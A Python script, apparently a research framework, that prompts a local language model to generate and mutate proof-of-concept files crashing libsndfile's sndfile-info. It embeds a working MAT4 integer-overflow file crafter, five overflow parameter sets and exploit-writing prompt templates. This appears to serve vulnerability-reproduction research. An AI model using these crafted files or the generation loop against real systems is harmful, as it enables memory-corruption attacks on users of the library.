#!/usr/bin/env python3
import argparse
import ast
import json
import os
import re
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Optional
current_script_dir = Path(__file__).resolve().parent
search_root = current_script_dir.parent
files_to_find = ['rag_tool_ollama.py', 'interact_with_ollama.py']
for filename in files_to_find:
    found_files = list(search_root.rglob(filename))
    if found_files:
        folder_path = str(found_files[0].parent.resolve())
        if folder_path not in sys.path:
            sys.path.insert(0, folder_path)
    else:
        raise FileNotFoundError(f"Could not find '{filename}' anywhere inside the project.")
from interact_with_ollama import call_ollama, check_ollama
from rag_tool_ollama import build_index, retrieve
FRAMEWORK_DIR = Path(__file__).parent.resolve()
CF_DIR = FRAMEWORK_DIR.parent
OUTPUT_DIR = CF_DIR / 'new_outputs' / 'libsndfile_outputs' / 'output'
WORK_DIR = OUTPUT_DIR / 'work'
POC_DIR = OUTPUT_DIR / 'POC'
VAR_DIR = OUTPUT_DIR / 'Variant'
LOG_PATH = OUTPUT_DIR / 'run.log'
DATASET_PATH = FRAMEWORK_DIR / 'input.json'
SNDFILE_INFO = Path(os.getenv('SNDFILE_INFO_PATH', str(Path('/workspace/libsndfile_source/programs/sndfile-info'))))
OLLAMA_BASE_URL = os.getenv('OLLAMA_BASE_URL', 'http://localhost:11434')
OLLAMA_MODEL = os.getenv('OLLAMA_MODEL', 'qwen2.5:72b')
OLLAMA_TIMEOUT_SECS = int(os.getenv('OLLAMA_TIMEOUT', '300'))
T_SESSIONS = int(os.getenv('T_SESSIONS', '10'))
I_REFINEMENTS = int(os.getenv('I_REFINEMENTS', '5'))
RAG_TOP_K = int(os.getenv('RAG_TOP_K', '3'))
MAX_SYNTAX_RETRIES = 2
ABLATION_NO_RAG = False
ABLATION_NO_REFINE_LOG = False
MARKER_FILENAME = 'crash_marker.txt'
ANCHOR_ID = '789'
PROVEN_GADGETS = [{'name': 'mat4_le_cols_overflow', 'desc': 'MAT4 little-endian: cols=2147486144 triggers rows*cols*8 int32 overflow', 'endian': 'little', 'marker': 0, 'rows': 2, 'cols': 2147486144, 'bwidth': 8, 'ext': 'mat'}, {'name': 'mat4_be_cols_overflow', 'desc': 'MAT4 big-endian: same overflow via big-endian marker', 'endian': 'big', 'marker': 1000, 'rows': 2, 'cols': 2147486144, 'bwidth': 8, 'ext': 'mat'}, {'name': 'mat4_le_maxint_overflow', 'desc': 'MAT4 LE: cols=INT32_MAX-1 maximises overflow', 'endian': 'little', 'marker': 0, 'rows': 2, 'cols': 2147483646, 'bwidth': 8, 'ext': 'mat'}, {'name': 'mat4_le_float_overflow', 'desc': 'MAT4 LE float: bytewidth=4, cols=2147483646', 'endian': 'little', 'marker': 0, 'rows': 4, 'cols': 2147483646, 'bwidth': 4, 'ext': 'mat'}, {'name': 'mat4_le_rows_overflow', 'desc': 'MAT4 LE: rows=2147486144 instead of cols', 'endian': 'little', 'marker': 0, 'rows': 2147486144, 'cols': 2, 'bwidth': 8, 'ext': 'mat'}]
_MUTATION_TYPES = ['Δcols', 'Δendian', 'Δrows', 'Δbwidth', 'Δformat']
_CRASH_KW = ['addresssanitizer', 'heap-buffer-overflow', 'stack-buffer-overflow', 'global-buffer-overflow', 'heap-use-after-free', 'segmentation fault', 'sigsegv', 'sigabrt', 'aborted', 'signal 6', 'signal 11', 'abort', 'core dumped', 'stack smashing detected', 'out-of-bounds']

def log(msg: str) -> None:
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f'[{ts}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a') as fh:
            fh.write(line + '\n')
    except Exception:
        pass

def _base_skeleton(entry_id: str) -> str:
    return f'#!/usr/bin/env python3\nimport argparse\nimport struct\nimport subprocess\nfrom pathlib import Path\n\nSNDFILE_INFO = "{SNDFILE_INFO}"\nMARKER_NAME  = "crash_marker.txt"\n\n\ndef craft_file(out_path: Path) -> None:\n    fmt    = "<"\n    name_s = b"samplerate\\x00"\n    sr_hdr = struct.pack(f"{{fmt}}IIIII", 0, 1, 1, 0, len(name_s)) + name_s\n    sr_val = struct.pack(f"{{fmt}}d", 44100.0)\n    name_d = b"data\\x00"\n    d_hdr  = struct.pack(f"{{fmt}}IIIII", 0, 2, 2147486144, 0, len(name_d)) + name_d\n    pad    = b"\\x00" * 8000\n    with open(out_path, "wb") as f:\n        f.write(sr_hdr + sr_val + d_hdr + pad)\n\n\ndef run_trigger(file_path: Path) -> tuple:\n    try:\n        r = subprocess.run(\n            [SNDFILE_INFO, str(file_path)],\n            capture_output=True, text=True, timeout=10,\n        )\n        return (r.stdout + r.stderr).strip(), r.returncode\n    except subprocess.TimeoutExpired:\n        return "TIMEOUT", -1\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description="libsndfile PoC ID {entry_id}")\n    parser.add_argument("--out-dir",  default="./out")\n    parser.add_argument("--run-load", action="store_true")\n    args = parser.parse_args()\n\n    out_dir = Path(args.out_dir).resolve()\n    out_dir.mkdir(parents=True, exist_ok=True)\n    crafted = out_dir / "crafted_payload.mat"\n    marker  = out_dir / MARKER_NAME\n\n    print("[+] Crafting exploit file...")\n    craft_file(crafted)\n    print(f"[+] File: {{crafted}}  size={{crafted.stat().st_size}}b")\n\n    if not args.run_load:\n        print("[*] Use --run-load to trigger.")\n        return 0\n\n    print("[+] Running sndfile-info trigger...")\n    output, rc = run_trigger(crafted)\n    print(output[:600])\n\n    crash_kw = [\n        "addresssanitizer", "heap-buffer-overflow", "stack-buffer-overflow",\n        "global-buffer-overflow", "heap-use-after-free", "segmentation fault",\n        "sigsegv", "sigabrt", "aborted", "signal 6", "signal 11",\n        "abort", "core dumped", "stack smashing detected",\n    ]\n    out_low = output.lower()\n    success = rc < 0 or any(kw in out_low for kw in crash_kw)\n    if success:\n        marker.write_text(f"exploit-ID_{entry_id}\\n")\n        print(f"[+] Confirmed! marker={{marker}}")\n    else:\n        print(f"[!] No crash/overflow. rc={{rc}}")\n    return 0\n\n\nif __name__ == "__main__":\n    raise SystemExit(main())\n'

def extract_code(text: str) -> str:
    m = re.search('```python\\s*(.*?)```', text, re.DOTALL)
    if m:
        return m.group(1).strip()
    m = re.search('```\\s*(.*?)```', text, re.DOTALL)
    if m:
        return m.group(1).strip()
    lines = [l for l in text.splitlines() if l.startswith(('import ', 'def ', 'class ', '#!'))]
    if lines:
        idx = text.find(lines[0])
        return text[idx:].strip()
    return text.strip()

def validate_syntax(code: str) -> tuple:
    try:
        ast.parse(code)
        return (True, '')
    except SyntaxError as e:
        return (False, str(e))

def _has_correct_argparse(code: str) -> bool:
    return '--out-dir' in code and '--run-load' in code

def build_rag_corpus(entries: list) -> dict:
    docs = {}
    for e in entries:
        eid = e['ID']
        text = ' '.join(filter(None, [e.get('Function Name', ''), e.get('Vulnerability', ''), e.get('Function Code', '')[:500]]))
        docs[eid] = text
    corpus = build_index(docs)
    log(f'[RAG] TF-IDF corpus built: {len(entries)} docs, {len(corpus['chunks'])} chunks')
    return corpus

def format_rag_context(hits: list, all_entries: dict) -> str:
    parts = []
    for eid, chunk_text, _ in hits:
        e = all_entries.get(str(eid), {})
        parts.append(f'--- Example ID={eid} ({e.get('Function Name', '')[:40]}) ---\nVulnerability: {e.get('Vulnerability', '')[:200]}\nPatch: {e.get('Patch', '')[:200]}\n')
    return '\n'.join(parts)

def memory_classify(output: str, entry_id: str, out_dir: Path) -> str:
    marker = out_dir / MARKER_FILENAME
    if marker.exists() and 'exploit-ID_' in marker.read_text(encoding='utf-8', errors='replace'):
        log(f'[Memory] ID={entry_id} → EXPLOIT SUCCESS — {marker.read_text(encoding='utf-8', errors='replace').strip()}')
        return 'success'
    last50 = '\n'.join(output.splitlines()[-50:]).lower()
    if any((kw in last50 for kw in _CRASH_KW)):
        marker.write_text(f'exploit-ID_{entry_id}\n')
        log(f'[Memory] ID={entry_id} → EXPLOIT SUCCESS — crash signal in output')
        return 'success'
    error_kw = ['error', 'traceback', 'exception', 'typeerror', 'importerror', 'syntaxerror', 'valueerror', 'nameerror', 'filenotfounderror']
    if any((kw in output.lower() for kw in error_kw)):
        return 'runtime_error'
    return 'no_exploit'

def sandbox_run(code: str, entry_id: str, attempt_dir: Path) -> tuple:
    script = attempt_dir / 'reproduce.py'
    out_dir = attempt_dir / 'out'
    out_dir.mkdir(parents=True, exist_ok=True)
    script.write_text(code)
    marker = out_dir / MARKER_FILENAME
    if marker.exists():
        marker.unlink()
    cmd = [sys.executable, str(script), '--run-load', '--out-dir', str(out_dir)]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return ('TIMEOUT', 'runtime_error')
    except Exception as exc:
        return (str(exc), 'runtime_error')
    return (output, memory_classify(output, entry_id, out_dir))

def build_poc_prompt(entry: dict, rag_ctx: str, anchor: dict, history: str) -> str:
    eid = entry['ID']
    fn_name = entry.get('Function Name', '')
    fn_code = entry.get('Function Code', '')[:1200]
    vuln = entry.get('Vulnerability', '')
    patch = entry.get('Patch', '')
    vuln_ln = entry.get('Vulnerability line number', '')
    anchor_code = _base_skeleton(anchor['ID'])
    return f'You are a security researcher generating a libsndfile exploit PoC.\n\n## Task\nGenerate a Python reproduce.py that crafts a malicious audio file triggering the vulnerability in function `{fn_name}` (ID={eid}).\n\n## Vulnerable function\n```c\n{fn_code}\n```\nVulnerable line ({vuln_ln}): `{vuln}`\nPatch: `{patch}`\n\n## Similar examples (RAG)\n{rag_ctx}\n\n## Working anchor (ID={anchor['ID']} - mat4 integer overflow):\n```python\n{anchor_code}\n```\n\n## Requirements\n1. craft_file(out_path) creates a malicious binary file triggering the vulnerability\n2. run_trigger() runs sndfile-info on it: `["{SNDFILE_INFO}", str(file_path)]`\n3. success detection (ASAN crash only):\n   crash_kw = ["addresssanitizer", "heap-buffer-overflow", "stack-buffer-overflow",\n               "heap-use-after-free", "segmentation fault", "sigsegv", "sigabrt",\n               "aborted", "signal 6", "signal 11", "abort", "core dumped",\n               "stack smashing detected"]\n   success = rc < 0 or any(kw in (stdout+stderr).lower() for kw in crash_kw)\n4. On success: write crash_marker.txt containing "exploit-ID_{eid}"\n5. MUST use argparse with --out-dir and --run-load (exact names, no changes)\n6. Adapt craft_file() to the specific format/vulnerability (mat4/wav/flac/aiff etc.)\n7. Do NOT use try/except blocks — let crashes propagate\n\n## History\n{(history if history else 'None')}\n\nRespond with ONLY the Python script inside ```python ... ``` block.\n'

def build_variant_prompt(entry: dict, verified_poc: str, rag_ctx: str, gadget: dict, mutation: str, crash_sig: str='') -> str:
    eid = entry['ID']
    fn_name = entry.get('Function Name', '')
    vuln = entry.get('Vulnerability', '')
    return f'You are a security researcher generating byte-level PoC variants for libsndfile (ID={eid}).\n\n## Vulnerability context\nFunction: {fn_name}\nVulnerability: {vuln}\n\n## Crash signature to preserve (fixed reference)\n{(crash_sig if crash_sig else 'heap-buffer-overflow or integer overflow in mat4_read_header')}\n\n## Mutation type: {mutation}\nNew parameters: {gadget['name']} — {gadget['desc']}\n  endian={gadget['endian']}, marker={gadget['marker']}, rows={gadget['rows']}, cols={gadget['cols']}, bwidth={gadget['bwidth']}\n\n## Seed PoC (byte-level binary craft):\n```python\n{verified_poc[:900]}\n```\n\n## Bit-mutation instructions (following AFL++ methodology)\nOnly mutate NUMBERS in the crafted binary file. Do NOT add new structures, fix bugs, or change file format.\n\n**In-depth mode**: Tweak numbers that directly control memory access — sizes (cols, rows, bwidth),\noffsets, direction flags. Goal: trigger same vulnerability via different memory layout.\n\n**Breadth mode**: Tweak numbers that control program flow to reach the same vulnerable code\nthrough a different path — marker byte (endianness), field ordering, data type field.\n\nRules:\n- Only increase/decrease existing numeric values, flip signs, or tweak a few bits\n- Keep the binary file structurally valid (correct field count, header present)\n- The crash_marker.txt MUST contain "exploit-ID_{eid}" on success\n- MUST keep --out-dir and --run-load argparse args unchanged\n\nRespond with ONLY the Python script in ```python ... ``` block.\n'

def build_fix_prompt(code: str, error: str, entry_id: str) -> str:
    return f'Fix this Python syntax error in the libsndfile PoC for ID={entry_id}:\nError: {error}\n```python\n{code[:600]}\n```\nReturn ONLY the fixed script in ```python ... ``` block.\n'

def _direct_variant(entry_id: str, gadget: dict) -> str:
    fmt = '<' if gadget['endian'] == 'little' else '>'
    mark = gadget['marker']
    rows = gadget['rows']
    cols = gadget['cols']
    craft = f'def craft_file(out_path: Path) -> None:\n    fmt    = "{fmt}"\n    name_s = b"samplerate\\x00"\n    sr_hdr = struct.pack(f"{{fmt}}IIIII", {mark}, 1, 1, 0, len(name_s)) + name_s\n    sr_val = struct.pack(f"{{fmt}}d", 44100.0)\n    name_d = b"data\\x00"\n    d_hdr  = struct.pack(f"{{fmt}}IIIII", {mark}, {rows}, {cols}, 0, len(name_d)) + name_d\n    pad    = b"\\x00" * 8000\n    with open(out_path, "wb") as f:\n        f.write(sr_hdr + sr_val + d_hdr + pad)'
    base = _base_skeleton(entry_id)
    base = re.sub('def craft_file\\(out_path: Path\\) -> None:.*?(?=\\n\\ndef )', lambda m: craft, base, flags=re.DOTALL)
    return base

def reasoning_loop(entry: dict, rag_ctx: str, anchor: dict, t_sessions: int, i_refinements: int, entry_dir: Path) -> Optional[tuple]:
    eid = entry['ID']
    for t in range(t_sessions):
        t_start = time.time()
        log(f'[Reasoning] ID={eid} session {t + 1}/{t_sessions} — fresh context')
        history = ''
        for i in range(i_refinements):
            log(f'[Reasoning] ID={eid} s={t + 1} refine={i + 1}/{i_refinements}')
            raw = call_ollama(build_poc_prompt(entry, rag_ctx, anchor, history))
            if not raw:
                log(f'[Reasoning] ID={eid} Ollama empty — skip')
                time.sleep(1)
                continue
            code = extract_code(raw)
            syntax_ok, syntax_msg = validate_syntax(code)
            for _ in range(MAX_SYNTAX_RETRIES):
                if syntax_ok:
                    break
                fix_raw = call_ollama(build_fix_prompt(code, syntax_msg, eid))
                if fix_raw:
                    code = extract_code(fix_raw)
                    syntax_ok, syntax_msg = validate_syntax(code)
            if not syntax_ok:
                log(f'[Reasoning] ID={eid} syntax unfixable — skip refine')
                history = f'SyntaxError: {syntax_msg}\nCode:\n{code[:300]}'
                continue
            if not _has_correct_argparse(code):
                log(f'[Reasoning] ID={eid} argparse broken — using base skeleton')
                code = _base_skeleton(eid)
            attempt_dir = entry_dir / f'poc_s{t + 1}_r{i + 1}'
            output, status = sandbox_run(code, eid, attempt_dir)
            log(f'[Reasoning] ID={eid} s={t + 1} r={i + 1} → {status}')
            for line in output.splitlines():
                if any((k in line for k in ['[+]', '[!]', 'exploit-ID_', 'overflow', 'truncat', 'Error'])):
                    log(f'  | {line}')
            if status == 'success':
                elapsed = time.time() - t_start
                log(f'[Reasoning] ID={eid} SUCCESS s={t + 1} r={i + 1} ({elapsed:.1f}s)')
                return (code, attempt_dir)
            if ABLATION_NO_REFINE_LOG:
                history = ''
            else:
                history = f'Attempt:\n{code[:400]}\nOutput:\n{output[-400:]}'
                if status == 'runtime_error':
                    log(f'[Reasoning] ID={eid} runtime error — feeding back')
                else:
                    log(f'[Reasoning] ID={eid} no exploit — revising')
            time.sleep(0.5)
        elapsed = time.time() - t_start
        log(f'[Reasoning] ID={eid} session {t + 1} exhausted ({elapsed:.1f}s)')
    log(f'[Reasoning] ID={eid} — budget exhausted (T={t_sessions} × I={i_refinements})')
    return None

def generate_variants(entry: dict, verified_poc: str, rag_ctx: str, anchor: dict, t_sessions: int, i_refinements: int, entry_dir: Path) -> list:
    eid = entry['ID']
    variants = []
    var_num = 1
    used = []
    for t, gadget in enumerate(PROVEN_GADGETS):
        if gadget['name'] in used:
            continue
        mutation = _MUTATION_TYPES[t % len(_MUTATION_TYPES)]
        log(f'[Variant] ID={eid} gadget={gadget['name']} mutation={mutation}')
        t_start = time.time()
        success_this = False
        for i in range(i_refinements):
            log(f'[Variant] ID={eid} s={t + 1} refine={i + 1}/{i_refinements}')
            raw = call_ollama(build_variant_prompt(entry, verified_poc, rag_ctx, gadget, mutation, crash_sig=entry.get('Vulnerability', '')))
            code = extract_code(raw) if raw else ''
            syntax_ok, syntax_msg = validate_syntax(code) if code else (False, 'empty')
            for _ in range(MAX_SYNTAX_RETRIES):
                if syntax_ok:
                    break
                fix_raw = call_ollama(build_fix_prompt(code, syntax_msg, eid)) if code else ''
                if fix_raw:
                    code = extract_code(fix_raw)
                    syntax_ok, syntax_msg = validate_syntax(code)
            if not syntax_ok or not _has_correct_argparse(code):
                log(f'[Variant] ID={eid} fallback to direct substitution')
                code = _direct_variant(eid, gadget)
                syntax_ok, _ = validate_syntax(code)
                if not syntax_ok:
                    continue
            attempt_dir = entry_dir / f'variant_{var_num}_s{t + 1}_r{i + 1}'
            output, status = sandbox_run(code, eid, attempt_dir)
            log(f'[Variant] ID={eid} s={t + 1} r={i + 1} → {status}')
            for line in output.splitlines():
                if any((k in line for k in ['[+]', '[!]', 'exploit-ID_', 'overflow', 'Error'])):
                    log(f'  | {line}')
            if status == 'success':
                elapsed = time.time() - t_start
                log(f'[Variant] ID={eid} variant_{var_num} CONFIRMED mutation={mutation} ({elapsed:.1f}s)')
                used.append(gadget['name'])
                marker = attempt_dir / 'out' / MARKER_FILENAME
                marker_content = marker.read_text().strip() if marker.exists() else ''
                crafted_files = list((attempt_dir / 'out').glob('crafted_payload.*'))
                if crafted_files:
                    pkl_src = crafted_files[0]
                    var_dest = VAR_DIR / eid / f'variant_{var_num}_{pkl_src.name}'
                    var_dest.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(pkl_src, var_dest)
                    log(f'[Output] ID={eid} variant_{var_num} file → {var_dest}')
                variants.append({'var_num': var_num, 'gadget': gadget['name'], 'mutation_type': mutation, 'session': t + 1, 'refinement': i + 1, 'marker': marker_content, 'elapsed_s': round(elapsed, 1)})
                var_num += 1
                success_this = True
                break
            time.sleep(0.5)
        if not success_this:
            log(f'[Variant] ID={eid} gadget={gadget['name']} failed all refinements')
    return variants

def process_entry(entry: dict, corpus: dict, all_entries: dict, anchor: dict, t_sessions: int, i_refinements: int) -> dict:
    eid = entry['ID']
    entry_dir = WORK_DIR / eid
    entry_dir.mkdir(parents=True, exist_ok=True)
    log(f'\n{'━' * 62}\n[Entry] ID={eid}  fn={entry.get('Function Name', '')[:50]}\n{'━' * 62}')
    entry_start = time.time()
    query = ' '.join(filter(None, [entry.get('Function Name', ''), entry.get('Vulnerability', '')]))
    if ABLATION_NO_RAG:
        rag_ctx = ''
        log(f'[Planner] ID={eid} RAG disabled (ablation)')
    else:
        hits = retrieve(query, corpus, top_k=RAG_TOP_K, exclude_id=eid)
        rag_ctx = format_rag_context(hits, all_entries)
        log(f'[Planner] ID={eid} RAG hits: {[h[0] for h in hits]}')
    result = reasoning_loop(entry, rag_ctx, anchor, t_sessions, i_refinements, entry_dir)
    poc_elapsed = time.time() - entry_start
    if result is None:
        log(f'[Entry] ID={eid} — no PoC found ({poc_elapsed:.1f}s)')
        return {'id': eid, 'status': 'NO_POC', 'poc_elapsed_s': round(poc_elapsed, 1), 'var_elapsed_s': 0, 'total_elapsed_s': round(poc_elapsed, 1), 'variants': []}
    verified_poc, poc_dir = result
    marker_path = poc_dir / 'out' / MARKER_FILENAME
    marker_content = marker_path.read_text().strip() if marker_path.exists() else ''
    log(f'[Entry] ID={eid} — PoC OK in {poc_elapsed:.1f}s | marker: {marker_content}')
    poc_crafted = list((poc_dir / 'out').glob('crafted_payload.*'))
    if poc_crafted:
        poc_dest = POC_DIR / eid / poc_crafted[0].name
        poc_dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(poc_crafted[0], poc_dest)
        log(f'[Output] ID={eid} PoC file → {poc_dest}')
    var_start = time.time()
    variants = generate_variants(entry, verified_poc, rag_ctx, anchor, t_sessions, i_refinements, entry_dir)
    var_elapsed = time.time() - var_start
    total_elapsed = time.time() - entry_start
    log(f'[Entry] ID={eid} — {len(variants)} variant(s) in {var_elapsed:.1f}s | total {total_elapsed:.1f}s')
    return {'id': eid, 'fn': entry.get('Function Name', ''), 'status': 'OK', 'marker': marker_content, 'poc_elapsed_s': round(poc_elapsed, 1), 'var_elapsed_s': round(var_elapsed, 1), 'total_elapsed_s': round(total_elapsed, 1), 'variants': variants}

def write_report(results: list, model: str, elapsed: float) -> Path:
    report = OUTPUT_DIR / 'report.md'
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ok = [r for r in results if r['status'] == 'OK']
    total_vars = sum((len(r.get('variants', [])) for r in ok))
    lines = ['# libsndfile PoCE — Run Report', f'**Date:** {ts}  |  **Model:** `{model}`  |  **Time:** {elapsed:.1f}s', '', '## Summary', '| Metric | Value |', '|--------|-------|', f'| Entries processed | {len(results)} |', f'| PoC verified      | {len(ok)} / {len(results)} |', f'| Total variants    | {total_vars} |', f'| Total time        | {elapsed:.1f}s  ({elapsed / 3600:.2f}hr) |', '', '## Per-Entry', '']
    for r in results:
        if r['status'] != 'OK':
            lines += [f'### ID={r['id']} — NO_POC  ({r.get('total_elapsed_s', '-')}s)', '']
            continue
        lines += [f'### ID={r['id']} — {r.get('fn', '')[:50]}', f'- Marker: `{r.get('marker', '')}`', f'- Time: PoC {r.get('poc_elapsed_s', '-')}s | Variants {r.get('var_elapsed_s', '-')}s', f'- Variants: {len(r.get('variants', []))}']
        for v in r.get('variants', []):
            lines.append(f'  - variant_{v['var_num']}  `{v['gadget']}`  {v['mutation_type']}  {v['elapsed_s']}s')
        lines.append('')
    report.write_text('\n'.join(lines))
    return report

def main() -> None:
    global OLLAMA_MODEL, OLLAMA_BASE_URL, T_SESSIONS, I_REFINEMENTS, RAG_TOP_K
    global ABLATION_NO_RAG, ABLATION_NO_REFINE_LOG
    parser = argparse.ArgumentParser(description='libsndfile PoCE — LLM-based exploit generator')
    parser.add_argument('--entry', default=None, help='Process only this ID')
    parser.add_argument('--entries', default=None, help='Comma-separated IDs (e.g. 754,932)')
    parser.add_argument('--sessions', type=int, default=T_SESSIONS)
    parser.add_argument('--refine', type=int, default=I_REFINEMENTS)
    parser.add_argument('--top-k', type=int, default=RAG_TOP_K)
    parser.add_argument('--model', default=OLLAMA_MODEL)
    parser.add_argument('--ollama-url', default=OLLAMA_BASE_URL)
    parser.add_argument('--skip-verified', action='store_true')
    parser.add_argument('--no-rag', action='store_true')
    parser.add_argument('--no-refine-log', action='store_true')
    args = parser.parse_args()
    OLLAMA_MODEL = args.model
    OLLAMA_BASE_URL = args.ollama_url
    T_SESSIONS = args.sessions
    I_REFINEMENTS = args.refine
    RAG_TOP_K = args.top_k
    ABLATION_NO_RAG = args.no_rag
    ABLATION_NO_REFINE_LOG = args.no_refine_log
    for d in [OUTPUT_DIR, WORK_DIR, POC_DIR, VAR_DIR]:
        d.mkdir(parents=True, exist_ok=True)
    log(f'[Init] libsndfile PoCE  model={OLLAMA_MODEL}  T={T_SESSIONS}  I={I_REFINEMENTS}')
    log(f'[Init] sndfile-info: {SNDFILE_INFO}  exists={SNDFILE_INFO.exists()}')
    log(f'[Init] output → {OUTPUT_DIR}')
    if not SNDFILE_INFO.exists():
        log(f'[Init] ERROR: sndfile-info not found at {SNDFILE_INFO}')
        sys.exit(1)
    if check_ollama(OLLAMA_BASE_URL):
        log(f'[Init] Ollama HTTP OK at {OLLAMA_BASE_URL}')
    else:
        log(f'[Init] WARNING: Ollama not reachable — responses will be empty')
    if not DATASET_PATH.exists():
        log(f'[Init] ERROR: dataset not found at {DATASET_PATH}')
        sys.exit(1)
    with open(DATASET_PATH, encoding='utf-8', errors='replace') as fh:
        entries = json.load(fh)
    all_entries = {e['ID']: e for e in entries}
    log(f'[Init] {len(entries)} entries loaded')
    anchor = all_entries.get(ANCHOR_ID, entries[0])
    log(f'[Init] anchor ID={ANCHOR_ID} ({anchor.get('Function Name', '')[:40]})')
    corpus = build_rag_corpus(entries)
    if args.entries:
        ids = [x.strip() for x in args.entries.split(',')]
        targets = sorted([e for e in entries if e['ID'] in set(ids)], key=lambda e: ids.index(e['ID']))
        if not targets:
            log(f'[Init] None of {ids} found in dataset')
            sys.exit(1)
    elif args.entry:
        targets = [e for e in entries if e['ID'] == args.entry]
        if not targets:
            log(f'[Init] ID {args.entry} not in dataset')
            sys.exit(1)
    else:
        targets = entries
    if args.skip_verified:
        before = len(targets)
        targets = [e for e in targets if not list((POC_DIR / e['ID']).glob('crafted_payload.*')) if not (POC_DIR / e['ID']).exists()]
        log(f'[Init] --skip-verified: skipped {before - len(targets)}')
    log(f'[Init] Processing {len(targets)} target(s)')
    run_start = time.time()
    results = []
    for entry in targets:
        r = process_entry(entry, corpus, all_entries, anchor, T_SESSIONS, I_REFINEMENTS)
        results.append(r)
    total_elapsed = time.time() - run_start
    results_json = OUTPUT_DIR / 'results.json'
    with open(results_json, 'w') as fh:
        json.dump(results, fh, indent=2)
    report = write_report(results, OLLAMA_MODEL, total_elapsed)
    if WORK_DIR.exists():
        shutil.rmtree(WORK_DIR)
    ok = [r for r in results if r['status'] == 'OK']
    total_vars = sum((len(r.get('variants', [])) for r in ok))
    log(f'\n{'=' * 62}')
    log(f'  DONE')
    log(f'  PoC verified   : {len(ok)}/{len(targets)}')
    log(f'  Variants       : {total_vars}')
    log(f'  Total time     : {total_elapsed:.1f}s  ({total_elapsed / 3600:.2f}hr)')
    log(f'  POC files      : {POC_DIR}/')
    log(f'  Variant files  : {VAR_DIR}/')
    log(f'  Report         : {report}')
    log(f'  Results JSON   : {results_json}')
    log(f'{'=' * 62}')
if __name__ == '__main__':
    main()